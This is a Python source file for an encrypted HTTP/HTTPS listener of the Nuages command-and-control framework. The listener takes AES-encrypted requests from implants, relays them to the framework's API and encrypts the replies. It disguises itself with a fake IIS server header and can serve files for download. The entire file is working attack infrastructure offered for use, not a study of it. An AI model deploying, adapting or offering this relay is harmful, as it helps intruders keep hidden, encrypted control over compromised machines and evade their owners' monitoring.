#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
from socketserver import ThreadingMixIn
import base64
import hashlib
import requests
from Cryptodome import Random
from Cryptodome.Cipher import AES
import binascii
import io
import argparse
import os
import sys
import ssl

class HTTPerror(Exception):
    def __init__(self, HTTPCode, HTTPContent):
        self.HTTPCode = HTTPCode
        self.HTTPContent = HTTPContent

class PKCS7Encoder(object):
    def __init__(self, k=16):
        self.k = k

    def decode(self, bytestring):
        val = bytestring[-1]
        if val > self.k:
            raise ValueError('Input is not padded or padding is corrupt')
        l = len(bytestring) - val
        return bytestring[:l]

    def encode(self, bytestring):
        val = self.k - (len(bytestring) % self.k)
        return bytestring + bytearray([val] * val)

class AESCipher(object):
    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        if len(raw) == 0:
            return raw
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        if len(enc) == 0:
            return b""
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:]))

    def _pad(self, s):
        return pkcs7.encode(s)

    def _unpad(self, s):
        return pkcs7.decode(s)

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

class S(SimpleHTTPRequestHandler):
    def _set_headers(self, code):
        self.send_response_only(code)
        self.send_header('Server', "Microsoft-IIS/8.0")
        self.send_header('Date', self.date_time_string())
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def POST(self, url, body):
        if url.count("/") > 2:
            headers = {'Content-type': 'application/octet-stream; charset=utf-8'}
        else:
            headers = {'Content-type': 'application/json; charset=utf-8'}

        if args.id:
            headers["listener"] = args.id

        response = requests.post(connectionString + url, data=body, verify=True, headers=headers)
        if response.ok:
            return response.content
        else:
            raise HTTPerror(response.status_code, response.content)

    def do_POST(self):
        length = int(self.headers['content-length'])
        url = "/implant/" + aes.decrypt(base64.b64decode(self.headers['Authorization'])).decode('utf-8')
        try:
            response = self.POST(url, aes.decrypt(self.rfile.read(length)))
            self._set_headers(200)
            self.wfile.write(aes.encrypt(response))
            if not args.quiet:
                self.log_request(200)
                print(url)
        except HTTPerror as e:
            self._set_headers(e.HTTPCode)
            self.wfile.write(aes.encrypt(e.HTTPContent))
            if not args.quiet:
                self.log_request(e.HTTPCode)
                print(url)
        except Exception as e:
            raise e

    def do_GET(self):
        if args.directory is None:
            SimpleHTTPRequestHandler.send_error(self, 404)
            return
        if self.path[-1:] == "/":
            SimpleHTTPRequestHandler.send_error(self, 404)
            return
        SimpleHTTPRequestHandler.do_GET(self)

    def log_message(self, format, *args2):
        if args.quiet:
            return
        sys.stderr.write("%s - - [%s] %s\n" %
                         (self.address_string(),
                          self.log_date_time_string(),
                          format % args2))

def run(server_class=ThreadingSimpleServer, handler_class=S, port=4040, certfile=None, keyfile=None):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)

    if certfile and keyfile:
        # Modern TLS with SSLContext
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=certfile, keyfile=keyfile)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        print(f'Starting AES256 HTTPS Handler on port: {port}')
    else:
        print(f'Starting AES256 HTTP Handler on port: {port}')

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('Finished.')
        sys.exit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start an encrypted Nuages HTTP/HTTPS handler')
    parser.add_argument("-p", "--port", default=443, type=int, help="The port to listen on")
    parser.add_argument("-k", "--key", required=True, help="The seed for the encryption key")
    parser.add_argument("-u", "--uri", default="http://127.0.0.1:3030", help="The URI of the Nuages API")
    parser.add_argument("-d", "--directory", help="Directory to serve for GET requests")
    parser.add_argument("-i", "--id", help="The listener ID for listener tracking")
    parser.add_argument("-q", "--quiet", action='store_true', help="Hide logs")
    parser.add_argument("-c","--cert", required=True, help="Path to the SSL certificate (PEM format)")
    parser.add_argument("--keyfile", required=True, help="Path to the SSL private key (PEM format)")
    args = parser.parse_args()

    aes = AESCipher(args.key)
    connectionString = args.uri
    pkcs7 = PKCS7Encoder()

    if args.directory:
        os.chdir(args.directory)

    run(ThreadingSimpleServer, S, args.port, args.cert, args.keyfile)

